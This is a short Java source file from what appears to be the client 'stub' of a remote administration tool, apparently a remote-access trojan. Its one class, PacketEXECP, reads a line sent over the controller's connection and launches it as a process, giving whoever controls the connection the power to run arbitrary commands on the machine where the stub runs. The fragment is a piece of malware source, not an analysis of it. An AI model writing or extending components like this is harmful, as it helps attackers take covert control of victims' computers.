package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.LaunchProcess;

public class PacketEXECP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String line = Connection.readLine();
		new LaunchProcess(line).start();
	}

}
